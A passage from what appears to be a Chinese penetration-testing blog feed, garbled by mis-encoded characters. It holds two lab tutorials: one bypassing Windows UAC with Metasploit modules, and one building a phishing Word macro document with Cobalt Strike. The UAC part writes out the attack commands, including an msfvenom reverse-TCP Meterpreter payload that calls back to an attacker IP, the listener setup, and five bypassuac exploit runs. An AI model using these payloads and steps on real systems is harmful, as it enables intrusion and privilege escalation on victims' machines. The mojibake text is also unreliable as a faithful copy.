ä¸ºå®ƒå°†è¢«â€œæå‡æƒé™â€ï¼Œè€Œä¸æ˜¯ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œçš„ç¨‹åºã€‚</p><p>ä¸€äº›æ²¡æœ‰ç®¡ç†å‘˜æƒé™æ— æ³•å®Œæˆçš„æ“ä½œï¼š</p><ul><li>æ³¨å†Œè¡¨ä¿®æ”¹ï¼ˆå¦‚æœæ³¨å†Œè¡¨é¡¹åœ¨HKEY_LOCAL_MACHINEä¸‹ï¼ˆå› ä¸ºå®ƒå½±å“å¤šä¸ªç”¨æˆ·ï¼‰ï¼Œå®ƒå°†æ˜¯åªè¯»çš„ï¼‰</li><li>åŠ è½½è®¾å¤‡é©±åŠ¨ç¨‹åº</li><li>DLLæ³¨å…¥</li><li>ä¿®æ”¹ç³»ç»Ÿæ—¶é—´ï¼ˆæ—¶é’Ÿï¼‰</li><li>ä¿®æ”¹ç”¨æˆ·å¸æˆ·æ§åˆ¶è®¾ç½®ï¼ˆé€šè¿‡æ³¨å†Œè¡¨ï¼Œå¯ä»¥å¯ç”¨/ç¦ç”¨è¯¥è®¾ç½®ï¼Œä½†æ‚¨éœ€è¦æ­£ç¡®çš„æƒé™æ‰èƒ½æ‰§è¡Œæ­¤æ“ä½œï¼‰</li><li>ä¿®æ”¹å—ä¿æŠ¤çš„ç›®å½•ï¼ˆä¾‹å¦‚Windowsæ–‡ä»¶å¤¹ï¼ŒProgram Filesï¼‰</li><li>è®¡åˆ’ä»»åŠ¡ï¼ˆä¾‹å¦‚ï¼Œä»¥ç®¡ç†å‘˜æƒé™è‡ªåŠ¨å¯åŠ¨ï¼‰</li></ul><p>UACä¸ä¼šè‡ªåŠ¨é˜»æ­¢æ¶æ„è½¯ä»¶ï¼Œå…¶ç›®çš„ä¸æ˜¯ç¡®å®šç¨‹åºæ˜¯å¦æ˜¯æ¶æ„è½¯ä»¶ã€‚è¿™åŒæ ·å–å†³äºç”¨æˆ·ã€‚å¦‚æœå°†ä»¥ç®¡ç†å‘˜æƒé™æ‰§è¡Œç¨‹åºï¼Œåˆ™å°†æé†’ç”¨æˆ·å¹¶ä¸”éœ€è¦ç”¨æˆ·ç¡®è®¤ã€‚ </p><h1 id="ç»•è¿‡UACçš„æ–¹æ³•"><a href="#ç»•è¿‡UACçš„æ–¹æ³•" class="headerlink" title="ç»•è¿‡UACçš„æ–¹æ³•"></a>ç»•è¿‡UACçš„æ–¹æ³•</h1><ul><li>æ”»å‡»æœºï¼škali Linux 192.168.232.133</li><li>é¶æœºï¼šwindows7 192.168.232.135</li></ul><p>é¦–å…ˆé€šè¿‡exploitè·å¾—ç›®æ ‡ä¸»æœºçš„meterprterã€‚</p><p>ç”Ÿæˆæœ¨é©¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.232.133 lport&#x3D;4444 -f exe -o payload.exe</span><br></pre></td></tr></table></figure><p>å¯ç”¨MSFç›‘å¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set lhost 192.168.232.133</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>æŠ•æ”¾æœ¨é©¬å¹¶è¿è¡Œï¼Œè·å¾—meterpreterä¼šè¯</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210721143926903.png" alt="image-20210721143926903"></p><p>æŸ¥çœ‹æ˜¯å¦æœ‰systemæƒé™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰ç³»ç»Ÿ/ç®¡ç†å‘˜æƒé™ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°è¯•ç»•è¿‡ç›®æ ‡ç³»ç»Ÿçš„UACä¿æŠ¤ã€‚</p><p>è¾“å…¥<code>background</code>å°†è·å–åˆ°çš„ä¼šè¯è½¬å…¥åå°ï¼Œæ›´æ¢å…¶ä»–expè¿›è¡Œææƒæ“ä½œã€‚</p><h2 id="æ–¹æ³•ä¸€ï¼šWindowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤"><a href="#æ–¹æ³•ä¸€ï¼šWindowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤" class="headerlink" title="æ–¹æ³•ä¸€ï¼šWindowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤"></a>æ–¹æ³•ä¸€ï¼šWindowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤</h2><p>æ­¤æ¨¡å—å°†é€šè¿‡è¿›ç¨‹æ³¨å…¥åˆ©ç”¨å—ä¿¡ä»»çš„å‘å¸ƒè€…è¯ä¹¦ç»•è¿‡Windows UACã€‚è¿™å°†äº§ç”Ÿç¬¬äºŒä¸ªshellï¼Œè€Œä¸”UACä¿æŠ¤å·²ç»å…³é—­ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br><span class="line">msf exploit windows&#x2F;local&#x2F;bypassuac) &gt; set session 1</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac) &gt; exploit</span><br></pre></td></tr></table></figure><p>ä»ä¸‹å›¾å¯ä»¥çœ‹åˆ°ï¼Œåˆå»ºç«‹äº†ä¸€ä¸ªmeterpreterä¼šè¯2è¿æ¥ï¼Œç°åœ¨è¾“å…¥getsystemå’Œgetuidä¸¤æ¡å‘½ä»¤æ¥æŸ¥çœ‹ç³»ç»Ÿæƒé™ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210721144920680.png" alt="image-20210721144920680"></p><h2 id="æ–¹æ³•äºŒï¼šå†…å­˜æ³¨å…¥"><a href="#æ–¹æ³•äºŒï¼šå†…å­˜æ³¨å…¥" class="headerlink" title="æ–¹æ³•äºŒï¼šå†…å­˜æ³¨å…¥"></a>æ–¹æ³•äºŒï¼šå†…å­˜æ³¨å…¥</h2><p>æ­¤æ¨¡å—å°†é€šè¿‡è¿›ç¨‹æ³¨å…¥åˆ©ç”¨å—ä¿¡ä»»çš„å‘å¸ƒè€…è¯ä¹¦ç»•è¿‡Windows UACã€‚è¿™å°†äº§ç”Ÿç¬¬äºŒä¸ªshellï¼Œè€Œä¸”UACä¿æŠ¤å·²ç»å…³é—­ã€‚æ­¤æ¨¡å—ä½¿ç”¨åå°„DLLæ³¨å…¥æŠ€æœ¯ä»…åˆ é™¤DLLpayloadäºŒè¿›åˆ¶æ–‡ä»¶è€Œä¸æ˜¯åˆ é™¤æ ‡å‡†æŠ€æœ¯ä¸­çš„ä¸‰ä¸ªå•ç‹¬çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ä½†æ˜¯ï¼Œå®ƒéœ€è¦é€‰æ‹©æ­£ç¡®çš„ä½“ç³»ç»“æ„ï¼ˆå¯¹äºSYSWOW64ç³»ç»Ÿä¹Ÿä½¿ç”¨x64ï¼‰ã€‚å¦‚æœæŒ‡å®šEXE :: Customï¼Œä½ çš„DLLåº”è¯¥åœ¨å•ç‹¬çš„è¿›ç¨‹ä¸­å¯åŠ¨payloadåè°ƒç”¨ExitProcess()ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_injection) &gt; set session 1</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_injection) &gt; exploit</span><br></pre></td></tr></table></figure><h2 id="æ–¹æ³•ä¸‰ï¼šé€šè¿‡FodHelperæ³¨å†Œè¡¨é¡¹"><a href="#æ–¹æ³•ä¸‰ï¼šé€šè¿‡FodHelperæ³¨å†Œè¡¨é¡¹" class="headerlink" title="æ–¹æ³•ä¸‰ï¼šé€šè¿‡FodHelperæ³¨å†Œè¡¨é¡¹"></a>æ–¹æ³•ä¸‰ï¼šé€šè¿‡FodHelperæ³¨å†Œè¡¨é¡¹</h2><p>æ­¤æ¨¡å—å°†é€šè¿‡åœ¨å½“å‰ç”¨æˆ·é…ç½®å•å…ƒä¸‹åŠ«æŒæ³¨å†Œè¡¨ä¸­çš„ç‰¹æ®Šé”®å¹¶æ’å…¥å°†åœ¨å¯åŠ¨Windows fodhelper.exeåº”ç”¨ç¨‹åºæ—¶è°ƒç”¨çš„è‡ªå®šä¹‰å‘½ä»¤æ¥ç»•è¿‡Windows 10 UACã€‚è¿™å°†äº§ç”Ÿç¬¬äºŒä¸ªshellï¼Œè€Œä¸”UACä¿æŠ¤å·²ç»å…³é—­ã€‚æ­¤æ¨¡å—ä¿®æ”¹æ³¨å†Œè¡¨é¡¹ï¼Œä½†åœ¨è°ƒç”¨payloadåæ¸…é™¤è¯¥é¡¹ã€‚è¯¥æ¨¡å—ä¸è¦æ±‚payloadçš„ç»“æ„ä¸OSåŒ¹é…ã€‚å¦‚æœæŒ‡å®šEXE :: Customï¼Œä½ çš„DLLåº”è¯¥åœ¨å•ç‹¬çš„è¿›ç¨‹ä¸­å¯åŠ¨payloadåè°ƒç”¨ExitProcess()ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_fodhelper</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_fodhelper) &gt; set session 1</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_fodhelper) &gt; exploit</span><br></pre></td></tr></table></figure><h2 id="æ–¹æ³•å››ï¼šé€šè¿‡Eventvwræ³¨å†Œè¡¨é¡¹"><a href="#æ–¹æ³•å››ï¼šé€šè¿‡Eventvwræ³¨å†Œè¡¨é¡¹" class="headerlink" title="æ–¹æ³•å››ï¼šé€šè¿‡Eventvwræ³¨å†Œè¡¨é¡¹"></a>æ–¹æ³•å››ï¼šé€šè¿‡Eventvwræ³¨å†Œè¡¨é¡¹</h2><p>æ­¤æ¨¡å—å°†é€šè¿‡åœ¨å½“å‰ç”¨æˆ·é…ç½®å•å…ƒä¸‹åŠ«æŒæ³¨å†Œè¡¨ä¸­çš„ç‰¹æ®Šé”®å¹¶æ’å…¥è‡ªå®šä¹‰å‘½ä»¤ï¼Œè¿™ä¸ªå‘½ä»¤å°†åœ¨å¯åŠ¨Windows fodhelper.exeåº”ç”¨ç¨‹åºæ—¶è°ƒç”¨æ¥ç»•è¿‡Windows 10 UACã€‚è¿™å°†äº§ç”Ÿç¬¬äºŒä¸ªshellï¼Œè€Œä¸”UACä¿æŠ¤å·²ç»å…³é—­ã€‚æ­¤æ¨¡å—ä¿®æ”¹æ³¨å†Œè¡¨é¡¹ï¼Œä½†åœ¨è°ƒç”¨payloadåæ¸…é™¤è¯¥é¡¹ã€‚è¯¥æ¨¡å—ä¸è¦æ±‚payloadçš„ç»“æ„ä¸OSåŒ¹é…ã€‚å¦‚æœæŒ‡å®šEXE :: Customï¼Œä½ çš„DLLåº”è¯¥åœ¨å•ç‹¬çš„è¿›ç¨‹ä¸­å¯åŠ¨payloadåè°ƒç”¨ExitProcess()ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; set session 1</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; exploit</span><br></pre></td></tr></table></figure><h2 id="æ–¹æ³•äº”ï¼šé€šè¿‡COMå¤„ç†ç¨‹åºåŠ«æŒ"><a href="#æ–¹æ³•äº”ï¼šé€šè¿‡COMå¤„ç†ç¨‹åºåŠ«æŒ" class="headerlink" title="æ–¹æ³•äº”ï¼šé€šè¿‡COMå¤„ç†ç¨‹åºåŠ«æŒ"></a>æ–¹æ³•äº”ï¼šé€šè¿‡COMå¤„ç†ç¨‹åºåŠ«æŒ</h2><p>æ­¤æ¨¡å—å°†é€šè¿‡åœ¨HKCUé…ç½®å•å…ƒä¸­åˆ›å»ºCOMå¤„ç†ç¨‹åºæ³¨å†Œè¡¨é¡¹æ¥ç»•è¿‡Windows UACã€‚åŠ è½½æŸäº›é«˜å®Œæ•´æ€§è¿›ç¨‹æ—¶ï¼Œä¼šå¼•ç”¨è¿™äº›æ³¨å†Œè¡¨é¡¹ï¼Œä»è€Œå¯¼è‡´è¿›ç¨‹åŠ è½½ç”¨æˆ·æ§åˆ¶çš„DLLã€‚è¿™äº›DLLåŒ…å«å¯¼è‡´ä¼šè¯å‡çº§çš„payloadã€‚åœ¨payloadè°ƒç”¨åæ¸…é™¤æ³¨å†Œè¡¨é¡¹ä¿®æ”¹ã€‚æ­¤æ¨¡å—è¦æ±‚payloadçš„ä½“ç³»ç»“æ„ä¸OSåŒ¹é…ï¼Œä½†å½“å‰çš„ä½æƒé™Meterpreterä¼šè¯çš„ä½“ç³»ç»“æ„å¹¶ä¸ç›¸åŒã€‚å¦‚æœæŒ‡å®šEXE :: Customï¼Œä½ çš„DLLåº”è¯¥åœ¨å•ç‹¬çš„è¿›ç¨‹ä¸­å¯åŠ¨payloadåè°ƒç”¨ExitProcessï¼ˆï¼‰ã€‚æ­¤æ¨¡å—é€šè¿‡ç›®æ ‡ä¸Šçš„cmd.exeè°ƒç”¨ç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶ã€‚å› æ­¤ï¼Œå¦‚æœé™åˆ¶cmd.exeè®¿é—®ï¼Œåˆ™æ­¤æ¨¡å—å°†æ— æ³•æ­£å¸¸è¿è¡Œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_comhijack</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_comhijack) &gt; set session 1</span><br><span class="line">msf exploit(windows&#x2F;local&#x2F;bypassuac_comhijack) &gt; exploit</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&mid=2247489975&idx=2&sn=31e8c3ff4a277f3e9f41de2f4b40dc3d&chksm=e916c98dde61409b4a819cb1b38e377d0283853d95abb69a76bd1ff49e53579a8589baacd3e5&mpshare=1&scene=23&srcid=##">åˆ©ç”¨metasploitç»•è¿‡UACçš„5ç§æ–¹å¼</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€åˆæ¢ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é’“é±¼ä¹‹officeå®æ”»å‡»</title>
      <link href="posts/38051.html"/>
      <url>posts/38051.html</url>
      
        <content type="html"><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯Officeå®ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯Officeå®ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯Officeå®ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯Officeå®ï¼Ÿ</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210720150905948.png" alt="image-20210720150905948"></p><p>å®æ˜¯ä¸€ç§ç‰¹æ®Šç”¨é€”çš„ç¨‹åºï¼Œç”¨äºåœ¨è¾ƒå¤§çš„åº”ç”¨ç¨‹åºæˆ–è½¯ä»¶ä¸­å®ç°è¿‡ç¨‹è‡ªåŠ¨åŒ–ã€‚å®é€šå¸¸ç”±ä¸€ç³»åˆ—å‘½ä»¤å’Œæ“ä½œç»„æˆï¼Œè¿™äº›å‘½ä»¤å’Œæ“ä½œæ˜¯ç”¨ä¸“ç”¨çš„å®è¯­è¨€æˆ–æ ‡å‡†ç¼–ç¨‹è¯­è¨€ç¼–å†™çš„ã€‚å½“æŸä¸ªè§¦å‘å™¨å‘ç”Ÿæ—¶ï¼Œåº”ç”¨ç¨‹åºå°†è‡ªåŠ¨æ‰§è¡Œè¿™äº›å‘½ä»¤ã€‚</p><p>å®åœ¨ Office å¥—ä»¶ä¸­å¾—åˆ°å¹¿æ³›å®ç°ï¼Œä»¥å®ç°å¸¸è§ä»»åŠ¡å’Œè¿‡ç¨‹çš„è‡ªåŠ¨åŒ–ã€‚ä¸åŒçš„å¥—ä»¶ä½¿ç”¨ä¸åŒçš„å®è¯­è¨€ï¼Œä½†å€¼å¾—æ³¨æ„çš„æ˜¯ Visual Basic for Applications (MS Office)ã€ LibreOffice Basic (LibreOffice)å’Œ OpenOffice Basic (OpenOffice Basic)ã€‚</p><p>å¤§å¤šæ•° Office å®è¯­è¨€å…·æœ‰ç›¸å½“å¹¿æ³›çš„ç‰¹æ€§ï¼Œå¯ä»¥è®¿é—®å„ç§èµ„æºã€‚ä¾‹å¦‚ï¼ŒMS Office å®(ç”¨ VBA ç¼–å†™)å¯ä»¥è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶å¹¶ä½¿ç”¨ç½‘ç»œåŠŸèƒ½ã€‚</p><h1 id="ä¸ºä»€ä¹ˆè¿™æ˜¯ä¸€ä¸ªé—®é¢˜ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆè¿™æ˜¯ä¸€ä¸ªé—®é¢˜ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¿™æ˜¯ä¸€ä¸ªé—®é¢˜ï¼Ÿ"></a>ä¸ºä»€ä¹ˆè¿™æ˜¯ä¸€ä¸ªé—®é¢˜ï¼Ÿ</h1><p>æ­£å¦‚ä»»ä½•å…è®¸åœ¨åå°æ‰§è¡Œå¯å®šåˆ¶è„šæœ¬çš„ç¨‹åºä¸€æ ·ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ Office å¥—ä»¶è¿è¡Œæ¶æ„ä»£ç å¹¶å±å®³å—å®³è€…ã€‚é€šå¸¸å®æ¶æ„è½¯ä»¶åœ¨æ„ŸæŸ“é“¾ä¸­æ‰®æ¼”åŠ è½½ç¨‹åºçš„è§’è‰²ï¼Œåœ¨ç»ˆæ­¢ä¹‹å‰ä¼šä¸‹è½½å¹¶æ‰§è¡Œå¦ä¸€ä¸ªæœ‰æ•ˆè½½è·ã€‚è¿™ä¸ªæ¶æ„è½¯ä»¶ä¼šè¢«æ¤å…¥åˆ°â€”â€”ä½ çŒœå¯¹äº†â€”â€”ä¸€ä¸ª Office æ–‡ä»¶ä¸­ï¼Œç„¶åè¢«æ¤å…¥åˆ°æŸä¸ªåœ°æ–¹ï¼Œè®©å—å®³è€…å¯ä»¥è®¿é—®å®ƒï¼Œæ¯”å¦‚è¯´ä¸€ä¸ªå…±äº«æ–‡ä»¶æˆ–è€…é€šè¿‡ç”µå­é‚®ä»¶ã€‚ä¸€æ—¦æ–‡ä»¶è¢«æ‰“å¼€ï¼Œæ¶æ„è½¯ä»¶å°†è¢«æ‰§è¡Œã€‚è¿™è¢«ç§°ä¸ºé±¼å‰å¼é’“é±¼æ”»å‡» ï¼Œå®ƒå·²ç»æµè¡Œäº†å¾ˆé•¿ä¸€æ®µæ—¶é—´ã€‚</p><p>å®æ¶æ„è½¯ä»¶çš„ä¸€ä¸ªä»¤äººéš¾å¿˜çš„ä¾‹å­æ˜¯ Melissa ç—…æ¯’ï¼Œå®ƒæœ€æ—©å‡ºç°åœ¨1999å¹´ã€‚è¿™ä¸ªæ¶æ„è½¯ä»¶åµŒå…¥åœ¨ä¸€ä¸ªå¾®è½¯ Word æ–‡ä»¶ä¸­ï¼Œä¸€æ—¦æ‰“å¼€ï¼Œå°±ä¼šè‡ªåŠ¨å‘é€ç”µå­é‚®ä»¶ç»™å—å®³è€…é€šè®¯å½•ä¸­çš„å‰50ä¸ªè”ç³»äººã€‚è™½ç„¶å®ƒæ²¡æœ‰å¯¹ä¸ªäººç”¨æˆ·é€ æˆå¤šå¤§ä¼¤å®³(é™¤äº†æ„å¤–åœ°ç»™ DDOS é€ æˆäº†å‡ ä¸ªé‚®ä»¶æœåŠ¡) ï¼Œä½†é€ æˆçš„æŸå¤±æ€»å€¼ä¼°è®¡ä¸º8000ä¸‡ç¾å…ƒï¼Œæ”»å‡»è€…è¢«åˆ¤å¤„åœ¨è”é‚¦ç›‘ç‹±æœåˆ‘20ä¸ªæœˆã€‚</p><p>é±¼å‰å¼ç½‘ç»œé’“é±¼æ–¹æ³•ä¹Ÿè¢«å„ç§å›¢ä½“ç”¨äºå¤æ‚çš„ APT æ”»å‡»ï¼ŒåŒ…æ‹¬ä¸€äº›è¢«è®¤ä¸ºä¸é—´è°æœºæ„æœ‰è”ç³»çš„å›¢ä½“ã€‚åœ¨ä¸€äº›æ›´å¤æ‚çš„æ”»å‡»ä¸­ï¼Œåˆæ³•çš„åŠå…¬æ–‡ä»¶è¢«æ¶æ„çš„ã€çœ‹èµ·æ¥å®Œå…¨ç›¸åŒçš„æ–‡ä»¶æ›¿ä»£ã€‚é‚£ä¹ˆï¼Œä¸ºä»€ä¹ˆä¸–ç•Œå„åœ°çš„é»‘å®¢ï¼ŒåŒ…æ‹¬é«˜çº§é»‘å®¢ç»„ç»‡ï¼Œä¼šé€‰æ‹©ä½¿ç”¨ä¸€ç§è‡ª90å¹´ä»£ä»¥æ¥æ²¡æœ‰å¤ªå¤§å˜åŒ–çš„æ”»å‡»æœºåˆ¶å‘¢ï¼Ÿ</p><h1 id="ç”¨æˆ·æ‰§è¡Œ"><a href="#ç”¨æˆ·æ‰§è¡Œ" class="headerlink" title="ç”¨æˆ·æ‰§è¡Œ"></a>ç”¨æˆ·æ‰§è¡Œ</h1><p>åœ¨å½“ä»Šä¸æ–­å‘å±•çš„å›½é˜²ç¯å¢ƒä¸­ï¼Œé±¼å‰å¼ç½‘ç»œé’“é±¼æ”»å‡»ä¾èµ–äºä¸€ä¸ªç‹¬ç‰¹çš„æ¼æ´ï¼Œè¿™ä¸ªæ¼æ´å¾ˆéš¾å®Œå…¨ç¼“è§£äººä¸ºé”™è¯¯ã€‚æ”»å‡»è€…ç­‰å¾…å—å®³è€…é‡‡å–æŸäº›è¡ŒåŠ¨(æ¯”å¦‚ï¼Œæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶)æ¥è·å¾—æ‰§è¡Œï¼Œè€Œä¸æ˜¯ä¾èµ–äºå—å®³è€…æœºå™¨çš„æ¼æ´ã€‚</p><p>æ­¤å¤–ï¼ŒMS Office å®æ‰§è¡Œé€šå¸¸æ˜¯é»˜è®¤å¯ç”¨çš„ï¼Œæˆ–è€…åœ¨æ‰“å¼€æ¶æ„æ–‡ä»¶æ—¶å•å‡»é¼ æ ‡å³å¯æ‰§è¡Œã€‚è¿™ä¸ºç”¨æˆ·çš„é”™è¯¯åˆ›é€ äº†å¾ˆå¤§çš„ä½™åœ°ï¼Œå¹¶å¢åŠ äº†æ”»å‡»æˆåŠŸçš„å¯èƒ½æ€§ã€‚</p><p>ä¾é ç”¨æˆ·æ‰§è¡Œè¿˜å…è®¸æ”»å‡»è€…ä¸“é—¨é’ˆå¯¹éæŠ€æœ¯ç”¨æˆ·è¿›è¡Œæ”»å‡»å’Œå¼•è¯±ï¼Œä»è€ŒæŸå®³æ•´ä¸ªä¼ä¸šçš„åˆ©ç›Šã€‚ä½†æ˜¯ï¼Œæ­£å¦‚æˆ‘ä»¬å°†åœ¨ä¸‹é¢çœ‹åˆ°çš„ï¼Œé€šè¿‡å®ç°é€‚å½“çš„ç«¯ç‚¹é˜²å¾¡æœºåˆ¶å’Œæ•™è‚²ç”¨æˆ·ï¼Œç¼“è§£ä»ç„¶æ˜¯å¯èƒ½çš„ã€‚</p><p>ä»¥ä¸‹æ˜¯å¾®è½¯å¨èƒæƒ…æŠ¥ä¸­å¿ƒåœ¨2016å¹´å¤å¤©æ”¶é›†çš„ä¸€ä¸ªå¸¸è§çš„å¾®è½¯ Office å®è¯±é¥µçš„ä¾‹å­:</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/word-image-427.png"></p><h1 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h1><p>è¿™é‡Œç”¨Cobalt Strikeç”Ÿæˆæ¶æ„çš„å®ä»£ç ï¼Œå¹¶ä»¥æ­¤åˆ›å»ºä¸€ä¸ªæ¶æ„çš„wordæ–‡ä»¶ã€‚å½“å—å®³è€…æœ‰æ„æˆ–æ— æ„æ‰“å¼€æ­¤æ–‡ä»¶ä¸”å¯ç”¨å®ï¼Œæ”»å‡»è€…å°±å¯ä»¥é€šè¿‡æå‰è®¾ç½®å¥½çš„ç›‘å¬å™¨è¿æ¥åˆ°å—å®³è€…çš„æœºå™¨ï¼Œä»è€Œè¿›ä¸€æ­¥åœ°åˆ©ç”¨ã€‚</p><p>å‰æï¼šå› ä¸èƒ½å…æ€ï¼Œé‡åˆ°æ€æ¯’è½¯ä»¶ç›´æ¥ggï¼Œæ•…æµ‹è¯•è¿‡ç¨‹ä¸­å…³é—­äº†æ‰€æœ‰æ€æ¯’è½¯ä»¶ã€‚ï¼ˆç«ç»’yyds!ï¼‰</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210720162518210.png" alt="image-20210720162518210"></p><h2 id="1-åˆ›å»ºç›‘å¬å™¨"><a href="#1-åˆ›å»ºç›‘å¬å™¨" class="headerlink" title="1.åˆ›å»ºç›‘å¬å™¨"></a>1.åˆ›å»ºç›‘å¬å™¨</h2><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210720153514707.png" alt="image-20210720153514707"></p><h2 id="2-ç”Ÿæˆå®ä»£ç "><a href="#2-ç”Ÿæˆå®ä»£ç " class="headerlink" title="2.ç”Ÿæˆå®ä»£ç "></a>2.ç”Ÿæˆå®ä»£ç </h2><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210720154150695.png" alt="image-20210720154150695"></p><h2 id="3-æ–°å»ºwordæ–‡æ¡£"><a href="#3-æ–°å»ºwordæ–‡æ¡£" class="headerlink" title="3.æ–°å»ºwordæ–‡æ¡£"></a>3.æ–°å»ºwordæ–‡æ¡£</h2><p>é€‰æ‹©è§†å›¾â€“&gt;å®â€“&gt;è®¾ç½®å®åâ€“&gt;åˆ›å»º</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210720154704861.png" alt="image-20210720154704861"></p><p>åˆ é™¤åŸæœ‰å†…å®¹ï¼ŒæŠŠå‰é¢å¤åˆ¶çš„å®ä»£ç ç²˜è´´è¿›å»ï¼Œç„¶åä¿å­˜ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210720154946944.png" alt="image-20210720154946944"></p><p>å›é€€åˆ°officeé¡µé¢ï¼Œæ³¨æ„ï¼šâ€œä¿å­˜ç±»å‹â€é€‰æ‹©â€œå¯ç”¨å®çš„Wordæ–‡æ¡£(*.docm)â€</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210720155243514.png" alt="image-20210720155243514"></p><h2 id="4-å¿«ä¹ä¸Šçº¿"><a href="#4-å¿«ä¹ä¸Šçº¿" class="headerlink" title="4.å¿«ä¹ä¸Šçº¿"></a>4.å¿«ä¹ä¸Šçº¿</h2><p>å½“ç›®æ ‡ç‚¹å‡»æ­¤wordæ–‡æ¡£ä¸”å¯ç”¨å®åï¼Œå°±å¯ä»¥å¿«ä¹ä¸Šçº¿CSäº†ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210720160739658.png" alt="image-20210720160739658"></p><p>é€šè¿‡CSåç»­åˆ©ç”¨~</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210720160021211.png" alt="image-20210720160021211"></p><h1 id="é˜²å¾¡æªæ–½"><a href="#é˜²å¾¡æªæ–½" class="headerlink" title="é˜²å¾¡æªæ–½"></a>é˜²å¾¡æªæ–½</h1><h2 id="ç›‘ç£å®æ‰§è¡Œ"><a href="#ç›‘ç£å®æ‰§è¡Œ" class="headerlink" title="ç›‘ç£å®æ‰§è¡Œ"></a>ç›‘ç£å®æ‰§è¡Œ</h2><p>é±¼å‰å¼é’“é±¼çš„å°è¯•ä¾èµ–äºç”¨æˆ·æ‰§è¡Œå’Œäººä¸ºé”™è¯¯æ¥å®ç°ã€‚å› 